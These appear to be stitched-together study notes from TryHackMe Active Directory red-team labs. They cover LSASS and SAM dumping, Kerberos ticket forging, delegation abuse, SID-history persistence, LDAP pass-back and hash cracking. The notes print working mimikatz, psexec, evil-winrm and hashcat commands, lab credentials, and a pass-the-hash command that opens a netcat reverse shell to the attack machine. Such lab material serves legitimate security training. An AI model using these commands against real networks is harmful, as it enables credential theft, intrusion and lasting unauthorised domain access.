Set up a listener on port 50000 on the attack machine, and connect to THMIIS via RDP from the attack machine by pivoting through the listener at THMJMP2: xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020 Flag is on desktop of t1_thomas.moore.

    "t": "Local Security Authority Subsystem Service ",
    "c": "Local Security Authority Subsystem Service  Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects. Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. If we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as “OS Credential Dumping: LSASS Memory (T1003)”. To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select “Create dump file”. An alternative way to dump a process if a GUI is not available to us is by using ProcDump . ProcDump is a Sysinternals process dump utility that runs from the command prompt. Mimikatz is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information and requires administrator and system privileges in order to dump memory and extract credentials.

    "c": "Persistence through SID history  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. This one is: Not easily removed except by RSAT tooling Difficult to find, not easily detected The legitimate use case of SID history is to enable access for an account to effectively be cloned to another. This becomes useful when an organisation is busy performing an AD migration as it allows users to retain access to the original domain while they are being migrated to the new one. In the new domain, the user would have a new SID, but we can add the user’s existing SID in the SID history, which will still allow them to access resources in the previous domain using their new account. While SID history is good for migrations, we, as attackers, can also abuse this feature for persistence. One way to abuse this feature is to add the SID of a privileged group – like the Domain Admins group – to the SID history of a low-level user. Even though the user is not a member of the group in AD, the system will authorise them as if they were due to the group SID being in their history. SSH into the domain controller using the given administrator credentials: ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Inspect the SID history and group membership of the unprivileged account from the credential distributor . powershell -ep bypass Get-ADUser 'user.name' -Properties sidhistory,memberof The SIDHistory property is an empty list {} and the MemberOf property shows that this user is only a member of the Internet Access group.

This means that any member of the Domain Users group (including our account) can add accounts to the IT Support Group. Furthermore, Bloodhound shows that the IT Support Group has the ForceChangePassword ACE for the Tier 2 Admins group members.

    "t": "Exploiting kerberos delegation ",
    "c": "Exploiting kerberos delegation  The general purpose of Kerberos delegation is to allow an application or service to access a resource on another machine on behalf of a user or machine. If a user logs into an application, the application will request resources on other machines on behalf of the user. It removes the need for a global service account with less granular permissions. Unconstrained Delegation  With Unconstrained Delegation, a host has no limit on the resources it can access on behalf of a user who connects, as long as the user has the TRUSTED_FOR_DELEGATION flag set. Once a user connects, the host requests a TGT for the user and caches it locally for future use. Given the TGT, an attacker could proceed to access any resource accessible by the user owner of the TGT. For example, if an Administrator logged on to the host with unconstrained delegation, the attacker would now be in possession of the Administrator’s TGT. Constrained Delegation  Constrained Delegation restricts the type of services a service acount can request on behalf of a user. For example, if a domain service account (sevice principal) was running a web application on a web server, constrained delegation would enable the administrator to choose which services to delegate access to on behalf of another user. An administrator could selectively filter delegation to resources such as HTTP, CIFS, LDAP, HOST, MSSQL, etc. If an attacker compromised a host configured for constrained delegation and obtained the NTLM hash or password of the service account, the attacker could request a TGT for the service account and use the TGT to request a TGS for the delegate account to access a particular service. Resource-Based Constrained Delegation  This model of delegation works inversely from the other delegation types. Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. For example, if we have permission to configure RBCD for a service, we have the ability to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service.

    "c": "Local Administrator Password Solution  GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission. Once upon a time, the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on MSDN . And because Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is Get-GPPPassword . In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password. The new method includes two new attributes ( ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime ) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd .

    "c": "Persistence through tickets  Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Golden Tickets  Golden Tickets are forged TGTs. What this means is we bypass steps 1 and 2 of the diagram above, where we prove to the DC who we are. Having a valid TGT of a privileged account, we can now request a TGS for almost any service we want. In order to forge a golden ticket, we need the krbtg account’s password hash so that we can sign a TGT for any user account we want. Some interesting notes about Golden Tickets: By injecting at this stage of the Kerberos process, we don’t need the password hash of the account we want to impersonate since we bypass that step. The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the krbtg hash, this verification passes and the TGT is declared valid no matter its contents. Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes. Since the policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC, such as, for example, that tickets should only be valid for 10 hours. We could, for instance, ensure that our TGT is valid for 10 years, granting us persistence. By default, the krbtg account’s password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever. The blue team would have to rotate the krbtg account’s password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services. Rotating the krbtg account’s password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won’t auto-request a new TGT. Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT. We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect. Apart from the krbtg account’s password hash, we only need the domain name, domain SID, and user ID for the person we want to impersonate. If we are in a position where we can recover the krbtg account’s password hash, we would already be in a position where we can recover the other pieces of the required information. Silver Tickets  Silver Tickets are forged TGS tickets. So now, we skip all communication (Step 1-4 in the diagram above) we would have had with the KDC on the DC and just interface with the service we want access to directly. Some interesting notes about Silver Tickets: The generated TGS is signed by the machine account of the host we are targeting. The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the krbtg account’s password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket’s scope is limited to whatever service is targeted on the specific server. Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect. Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host’s local administrators group. The machine account’s password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host’s registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine. While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.

    "c": "Use of alternate authentication material  NTLM authentication flow  This is for domain authentication. In local authentication, this process only occurs between the client and server, as the server keeps the user's NTLM hash in the SAM If an attacker manages to compromise a machine where a domain user is logged in, the attacker may be able to dump the domain user’s NTLM hash from memory by using a tool like mimikatz or other methods. The attacker could try to crack the hash(es) and user passwords. User sends hash (not password). This allows an attacker to authenticate as a user in certain situations without ever needing to know a password, called pass-the-hash . It does require dumping hashes locally or remotely. Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Cracking hashes  As a result of extracting credentials from a host where we have attained administrative privileges, we might get clear-text passwords, or hashes that can be easily cracked. NTLM hash (NTHash)  These hashes can be obtained by dumping the SAM database or using mimikatz . They are also stored on domain controllers in the NTDS file. These are the hashes that can be used to pass-the-hash . Usually people call this the NTLM hash (or just NTLM), which is misleading, as Microsoft refers to this as the NTHash (at least in some places). Example: B4B9B02E6F09A9BD760F388B67351E2B The algorithm: MD4(UTF-16-LE(password)) UTF-16-LE is the little endian UTF-16 . Windows used this instead of the standard big endian. Cracking: john --format=nt hash.txt hashcat -m 1000 -a 3 hash.txt NTLMv1 (Net-NTLMv1) hash  The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses both the NT and LM hash, depending on configuration and on what is available. A way of obtaining a response to crack from a client, responder can be used. The value to crack would be the K1 | K2 | K3 . Version 1 is deprecated, but might still be used in some old systems on the network. Example u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c The algorithm: C = 8-byte server challenge, random K1 | K2 | K3 = LM/NT-hash | 5-bytes-0 response = DES(K1,C) | DES(K2,C) | DES(K3,C) Cracking: john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt NTLMv2 (Net-NTLMv2) hash  The new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, but a different algorithm and responses are sent to the server. Can also be captured with responder . This is the Default in Windows since Windows 2000. Example: admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 The algorithm: SC = 8-byte server challenge, random CC = 8-byte client challenge, random CC* = (X, time, CC2, domain name) v2-Hash = HMAC-MD5(NT-Hash, user name, domain name) LMv2 = HMAC-MD5(v2-Hash, SC, CC) NTv2 = HMAC-MD5(v2-Hash, SC, CC*) response = LMv2 | CC | NTv2 | CC* Cracking: john --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 hash.txt Pass-the-hash  The NTLM challenge sent during authentication can be responded to just by knowing the password hash. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can pass-the-hash (PtH) for authentication. Assuming NTLMv2, To extract NTLM hashes, use mimikatz to read the local SAM or extract hashes directly from LSASS memory. Extracting NTLM hashes from local SAM will only allow getting hashes from local users on the machine. No domain user hashes will be available. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # lsadump::sam Extracting NTLM hashes from LSASS memory will give any NTLM hashes for local users and any domain user that has recently logged onto the machine. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::msv The extracted hashes can be used in a PtH attack by using mimikatz to inject an access token for the target user on a reverse shell (or any other command): mimikatz # token::revert mimikatz # sekurlsa::pth /user:<username> /domain:<domainname> /ntlm:6b4a57f67805a663c818106dc0648484 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5555\" token::revert reestablishes the original token privileges, because trying to pass-the-hash with an elevated token will not work. Run a reverse listener on the attack machine: nc -lnvp 5555 Running the whoami command on this shell, it will still show the original user from before doing the PtH, but any command run from here will use the credentials thet were injected. Some Linux tools have built-in support for PtH attacks using different protocols. Depending on which services are available, try: Connect to RDP using PtH: xfreerdp /v:<IP target> /u:<domainname>\\\\<username> /pth:<ntlmhash> Connect via psexec using PtH: psexec.py -hashes <ntlmhash> <domainname>/<username>@<IP target> Note: Only the linux version of psexec supports PtH. Connect to WinRM using PtH: evil-winrm -i <IP target> -u <username> -H <ntlmhash> Pass-the-ticket  It may be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz . This usually requires having SYSTEM privileges on the attacked machine: mimikatz # privilege::debug mimikatz # sekurlsa::tickets /export Extracting TGTs will require administrator privileges, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account). We need the ticket and its corresponding session key. Inject the ticket into the current session: mimikatz # kerberos::ptt <ticket> Where ticket looks something like: [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi Injecting tickets in our own session does not require administrator privileges. After this, the tickets will be available for any tools used for lateral movement. To check if the tickets were correctly injected, exit out of the mimikatz session and: za\\user.name@THMJMP2 C:\\> klist Overpass-the-hash/Pass-the-key  This attack is similar to PtH but then for Kerberos networks.

Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. In Exploiting certificates , certificates were leveraged to become Domain Admins. Certificates can also be used for persistence. This attack revolves around taking the private key of the Certificate Authority (CA) of the domain. Armed with the private key, the attacker can now effectively “approve” their own Certificate Signing Requests (CSRs) and generate certificates to any user they please. In Kerberos authentication, a user can authenticate by providing their public key. SSH to the domain controller using the given domain administrator credential .

    "c": "Local Windows credentials  Keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were initially designed for legitimate purposes such as feedback for software development or parental control. And, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we can use keylogging with tools like the Metasploit framework. An example use case can be found in Exploiting AD users . Security Account Manager (SAM)  The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. It can not be read and accessed by any users while the Windows operating system is running. And there are ways and attacks to dump the content of the SAM database. The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. Another approach uses the Microsoft Volume shadow copy service , which helps perform a volume backup while applications read/write on volumes. Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some SAM database contents to be used by Windows services. Shadow Copy  Use wmic (with administrator privileges) to create a shadow volume copy: Run the standard cmd.exe prompt with administrator privileges. Execute the wmic command to create a copy shadow of C: drive Verify the creation from step 2 is available. Copy the SAM database from the volume created in step 2 Copy shadow of C: drive: C:\\Users\\Administrator>wmic shadowcopy call create Volume='C:\\' To list and confirm that we have a shadow copy of the C: volume: C:\\Users\\Administrator>vssadmin list shadows A shadow copy volume was created: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 The SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need the decryption key stored in c:\\Windows\\System32\\Config\\system . Copy both files (sam and system) from the shadow copy volume to the desktop, and then to the attack machine.

    "c": "Persistence through credentials  It is not sufficient to have a single domain controller per domain in large organisations. These domains are often used in multiple regional locations, and having a single DC would significantly delay any authentication services in AD. These organisations make use of multiple DCs. Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information. This includes updated information such as the user’s new password and new objects such as when a new user is created. The process of replication is called DC Synchronisation. It is not just the DCs that can initiate replication. Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating a new domain controller. A popular attack to perform is a DC Sync attack. With access to an account that has domain replication permissions, it is possible to stage a DC Sync attack to harvest credentials from a DC. Passwords  Passwords can easily be changed and will be changed by the blue team when an attacker is discovered.

    "t": "LDAP bind credentials ",
    "c": "LDAP bind credentials  Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. And with LDAP authentication, the application directly verifies the user’s credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user’s credentials. LDAP authentication is a much used mechanism with third-party (non-Microsoft) applications that integrate with AD. Examples of applications and systems: Gitlab Jenkins Custom-developed web applications Printers VPNs If any of these applications or services are exposed on the internet, the same type of attacks as leveraged against NTLM authenticated systems can be used. And because a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. We can attempt to recover the AD credentials used by the service to gain authenticated access to AD. LDAP pass-back  A common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom. LDAP Pass-back attacks can be performed when we gain access to a device’s configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Often, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password . Test settings In this case, we can not directly extract the LDAP credentials because the password is hidden: We did find a username though. But we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials. Rogue LDAP server  install OpenLDAP: sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd Reconfigure the LDAP server to use za.tryhackme.com for the DNS domain name and Organisation: sudo dpkg-reconfigure -p low slapd Make it vulnerable by downgrading the supported authentication mechanisms. Create a file olcSaslSecProps.ldif : # olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred olcSaslSecProps : Specifies the SASL security properties noanonymous : Disables mechanisms that support anonymous login minssf : Specifies the minimum acceptable security strength with 0, meaning no protection. Use the ldif file to patch the LDAP: $ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 modifying entry \"cn=config\" Check: ldapsearch -H ldap:// -x -LLL -s base -b \"\" supportedSASLMechanisms dn: supportedSASLMechanisms: PLAIN supportedSASLMechanisms: LOGIN Capturing LDAP credentials  Click the “Test Settings” at http://printer.za.tryhackme.com/settings.aspx again, the authentication will occur in clear text. If you the rogue LDAP server is configured correctly, and is downgrading the communication, you will receive the following error: “This distinguished name contains invalid syntax”. If you receive this error, you can use a tcpdump to capture the credentials: sudo tcpdump -SX -i breachad tcp port 389 Or fire up Wireshark or tshark and find the cleartext bind request password. Stop the LDAP server. sudo systemctl disable --now slapd",

    "c": "Persistence through group membership  Warning  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. The most privileged groups or resources are not always the best choice, as they are often more closely watched for changes by the blue team. Exploiting permission delegation gave privileges to reset user passwords, which would be good for maintaining access to workstations. A local administrator group may be less monitored than a global administrator groups, and a group nested in a privileged group may be the access needed.

    "c": "Credential access  Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than exploiting systems using CVEs. Credentials are stored insecurely in various locations in systems: Unsecured Credentials: Credentials In Files - search a compromised machine for credentials in local or remote file systems. Clear-text files could include sensitive information created by a user, containing passwords, private keys, etc. Database files Memory Password managers Enterprise Vaults Active Directory Network Sniffing PowerShell history  As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt . It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, to look for the password keyword in the Window registry: c:\\Users\\user> reg query HKLM /f password /t REG_SZ /s OR C:\\Users\\user> reg query HKCU /f password /t REG_SZ /s Database Files  Applications use database files to read or write settings, configurations, or credentials. Database files are usually stored locally in Windows operating systems. These files are an excellent target to check and hunt for credentials. Configuration files contains a showcase example of extracting credentials from the local McAfee Endpoint database file. Password Managers  A password manager is an application to store and manage users’ login information for local and Internet websites and services. Since it deals with users’ data, it must be stored securely to prevent unauthorized access. Password Manager applications can be built-in (Windows) or third-party, like KeePass, 1Password, LastPass Misconfiguration and security flaws are found in these applications that let adversaries access stored data. Various tools can be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications. Memory Dump  The Operating system’s memory is a rich source of sensitive information that belongs to the Windows OS, users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, accessing memory is limited to administrator users who fully control the system. The following are examples of memory stored sensitive data, including clear-text credentials, cached passwords, and AD Tickets. Active Directory  Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room. The following are some Active Directory misconfigurations that may leak users’ credentials: Users’ description: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorised access. Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. NTDS: Contains AD users’ credentials, making it a target for attackers. AD Attacks: Misconfiguration makes AD vulnerable to various attacks. Network Sniffing  Gaining initial access to a target network enables attackers to attack local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets the attacker create a rogue or spoof trusted resources within the network to steal authentication information such as NTLM hashes.
